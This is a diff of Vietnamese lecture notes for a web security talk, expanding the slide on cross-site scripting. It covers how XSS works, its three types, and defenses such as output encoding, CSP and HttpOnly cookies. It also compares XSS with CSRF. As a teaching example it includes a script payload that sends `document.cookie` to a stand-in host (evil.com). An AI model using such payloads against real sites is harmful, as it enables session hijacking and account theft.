@@ -286,14 +286,45 @@
 - "XSS = **JS của attacker chạy trong browser nạn nhân.** Hậu quả: trộm token, hành động thay user."
 - "**Fix: output encoding/escaping** (cả server lẫn client), **CSP**, và **đừng để token trong `localStorage`** — XSS đọc sạch mọi thứ ở đó."
 
-> 📖 **HIỂU SÂU — XSS & cách demo (đã fix demo):**
-> - **Bản chất:** trang web nhúng **nội dung do người dùng nhập** vào HTML mà **không escape**. Nếu nội dung đó là `<script>...</script>`, trình duyệt nạn nhân **chạy nó như code của trang** → nó có mọi quyền của trang đó (đọc cookie không-HttpOnly, đọc `localStorage`, gọi API thay user).
-> - **3 loại:** **Stored** (payload lưu trong DB, vd comment độc → ai xem cũng dính), **Reflected** (payload trong URL phản chiếu lại trang), **DOM-based** (JS client tự nhét input vào DOM).
-> - **Fix gốc — output encoding:** khi in nội dung ra HTML, đổi ký tự đặc biệt thành entity: `<` → `&lt;`, `>` → `&gt;`... → trình duyệt hiển thị nó như **text**, không phải thẻ. (Framework như React tự escape mặc định — nên hiếm dính trừ khi `dangerouslySetInnerHTML`.)
-> - **CSP** = lớp phòng thủ thứ hai: bảo browser "chỉ chạy script từ nguồn này" → dù lọt payload cũng khó chạy.
-> - **Vì sao "đừng để token trong localStorage":** JS đọc `localStorage` thoải mái → nếu dính XSS, token bị hút sạch. Token nhạy cảm nên để **cookie HttpOnly** (JS không đọc được).
-> - **CÁCH DEMO (XSS Sandbox):** gõ/bấm sample payload bên **trái (Unsanitized)** → khung **đỏ lên + banner "💥 injected script ran"** = script đã chạy = XSS thật. Bên **phải (Sanitized)** → payload hiện ra dưới dạng **text vô hại** = escape đã chặn. Câu chốt: *"cùng một input, khác nhau ở chỗ có escape hay không."*
-> - 🔗 **Cầu nối:** "để token ở đâu cho an toàn — chính là phần token storage ở lecture JWT/session." (1 câu, không sa đà.)
+> 📖 **HIỂU SÂU — XSS: "JS của kẻ tấn công chạy trong trang của bạn":**
+>
+> **1) Vì sao nguy hiểm — niềm tin same-origin.** Trình duyệt có quy tắc cốt lõi: code chạy trong trang `bank.com` thì **toàn quyền** với bank.com (đọc cookie không-HttpOnly, đọc `localStorage`, gọi API thay user, sửa giao diện). Bình thường chỉ code *do bank.com viết* mới chạy ở đó. **XSS phá vỡ điều này** — nó lén nhét script của kẻ tấn công vào trang, và **trình duyệt không phân biệt được** đâu là script thật, đâu là script lén → tin tất cả như nhau.
+> *Câu để nói:* "Trình duyệt tin mọi script trong một trang đều là của trang đó. XSS lợi dụng đúng niềm tin đó."
+>
+> **2) Cơ chế — input in thẳng ra HTML không escape.** Ví dụ ô comment. User gõ comment, server in lại ra HTML. Nếu kẻ tấn công gõ comment là:
+> ```html
+> <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
+> ```
+> và server in **thẳng** vào trang → **mọi người mở trang đều chạy đoạn đó** → cookie bị gửi về evil.com. 💥 Trình duyệt thấy thẻ `<script>` trong HTML thì chạy, **không cần biết** nó do user nhập hay do dev viết.
+> → Cùng **công thức OWASP** với SQLi: *input không tin được chạm sink nhạy cảm*. SQLi sink là **câu SQL**; XSS sink là **HTML của trang**. Cùng lỗi: trộn *data* (input) với *code*.
+>
+> **3) Ba loại:**
+> | Loại | Payload ở đâu | Ví dụ |
+> |---|---|---|
+> | **Stored** (nguy nhất) | Lưu trong **DB**, hiện cho mọi người | Comment độc → ai xem cũng dính |
+> | **Reflected** | Trong **URL**, phản chiếu lại trang | Link `search?q=<script>` gửi qua email |
+> | **DOM-based** | JS client tự nhét input vào DOM | `el.innerHTML = location.hash` |
+>
+> **4) Hậu quả:** trộm token/cookie → chiếm phiên · hành động thay user (chuyển tiền, đổi email) · keylog, form giả lừa mật khẩu.
+>
+> **5) Phòng thủ:**
+> - **Output encoding (gốc rễ):** in ra HTML thì đổi ký tự đặc biệt thành entity: `<` → `&lt;`, `>` → `&gt;` → trình duyệt hiển thị `<script>` như **text vô hại**, không phải thẻ để chạy. (React/framework hiện đại **escape mặc định**; chỉ dính khi dùng `dangerouslySetInnerHTML`.)
+> - **CSP** = lớp thứ hai: bảo browser "chỉ chạy script từ nguồn này" → lọt payload cũng khó chạy.
+> - **Token để cookie `HttpOnly`, KHÔNG để `localStorage`:** localStorage thì JS đọc thoải mái → dính XSS là mất sạch; HttpOnly thì JS **không đọc được**.
+>
+> **6) XSS vs CSRF (rất hay bị hỏi — 2 slide cạnh nhau):**
+> | | XSS | CSRF |
+> |---|---|---|
+> | Kẻ tấn công làm gì | **Chạy code lạ** trong trang bạn | **Mượn phiên hợp lệ** gửi request giả |
+> | Cần chạy JS trong trang nạn nhân? | **Có** | **Không** |
+> | Phòng thủ chính | Output encoding, CSP | `SameSite`, CSRF token |
+> | Bearer header cứu được? | Không (đọc được nếu ở localStorage) | **Có** (header không tự đính kèm) |
+>
+> *Câu chốt phân biệt:* "XSS = chạy code của kẻ tấn công trong trang bạn. CSRF = không chạy code gì cả, chỉ lợi dụng cookie trình duyệt tự gửi."
+>
+> **7) CÁCH DEMO (XSS Sandbox — đã fix):** bấm sample bên **trái (Unsanitized)** → khung **đỏ + banner "💥 injected script ran"** = script chạy = XSS thật. Bên **phải (Sanitized)** → cùng payload hiện ra dưới dạng **text vô hại** = escape đã chặn. Chốt: *"cùng một input — không escape thì script chạy, escape thì chỉ là chữ. Output encoding là tất cả."*
+>
+> 🔗 **Cầu nối:** "để token ở đâu cho an toàn — chính là phần token storage ở lecture JWT/session." (1 câu, không sa đà.)
 
 ### SLIDE 5.5 — "Change the ID, Get Someone Else's Data" (Broken Access Control / IDOR) `~1.5 phút`
 **NÓI:**
